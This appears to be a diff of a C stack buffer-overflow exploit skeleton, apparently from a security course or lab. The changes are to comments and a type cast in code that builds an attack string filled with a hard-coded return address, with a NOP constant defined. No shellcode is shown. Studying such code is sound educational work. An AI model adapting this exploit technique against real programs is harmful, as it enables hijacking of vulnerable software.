@@ -8,28 +8,23 @@
 
 #define NOP         0x90                // NOP instruction
 #define ATTACK_SIZE 148                 // Size of the attack_string
-#define RET_ADDR 0xbffffd48             // Address of the start of attack_string
+#define RET_ADDR    0xbffffd48          // Address inside of the attack_string
 
 int main(void)
 {
     char *args[3];
     char *env[1];
 
-    int i;                              // Loop counter, duh
-    char * attack_string;               // The attack_string, oy this comment is redundant
+    int i;                              // Loop counter
+    char * attack_string;               // The attack_string, in case it wasn't obvious
     char * char_ptr;                    // Pointer for traversing attack_string 1 byte at a time
     long *addr_ptr;                     // Pointer for traversing attack_string 4 bytes at a time
 
     // Allocate memory for the attack string
     attack_string = malloc(sizeof(char) * ATTACK_SIZE);
 
-    // TEMPORARY: Fill attack_string with 
-    //for(i = 0; i < ATTACK_SIZE * 4; i++) {
-    //    attack_string[i] = 0x33;
-    //}
-
     // 1. Fill attack_string with return address
-    addr_ptr = attack_string;
+    addr_ptr = (long *) attack_string;
     for(i = 0; i < ATTACK_SIZE; i += 4) {
         *(addr_ptr++) = RET_ADDR;
     }
